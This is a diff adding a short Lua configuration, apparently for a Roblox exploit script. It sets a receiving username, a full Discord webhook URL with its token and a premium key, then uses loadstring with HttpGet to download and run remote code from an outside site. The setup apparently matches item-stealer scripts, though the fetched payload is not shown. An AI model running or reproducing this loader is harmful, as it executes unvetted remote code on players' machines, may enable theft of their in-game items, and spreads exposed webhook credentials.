@@ -1,0 +1,9 @@
+UserName = "lucivferv"
+Webhook = "https://discord.com/api/webhooks/1094779719985147994/X9Wn9eaYC0F1zJAHuvQJ2fWJ37UzyHLhlSwqkgkQPsovSSf9M9ycyDCbgarQrXRekaV8"
+_G.PremiumKey = "zc82YnGvwnokyxduSVez"
+_G.ScriptName = "la"
+_G.FirstText = "test"
+_G.SecondText = "test"
+_G.ThirdText = "test"
+_G.WaitingTime = 80
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
